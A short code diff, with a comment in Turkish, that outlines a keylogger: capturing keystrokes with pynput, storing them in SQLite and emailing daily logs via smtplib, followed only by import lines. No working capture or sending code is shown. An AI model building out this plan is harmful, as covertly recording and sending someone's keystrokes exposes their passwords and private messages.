@@ -1,3 +1,11 @@
+#Bu projede klavye basmalarını algılamak için "pynput" kütüphanesini kullanabiliriz. Bu kütüphane, klavye etkileşimlerini
+algılamak ve kontrol etmek için fonksiyonlar sunar. Ayrıca,
+verileri saklamak için bir veritabanı kullanabiliriz, örneğin SQLite.
+Günlük verileri e-posta ile göndermek için "smtplib" kütüphanesini kullanabiliriz.#
+
+
+
+
 import pynput
 from pynput import keyboard
 import sqlite3
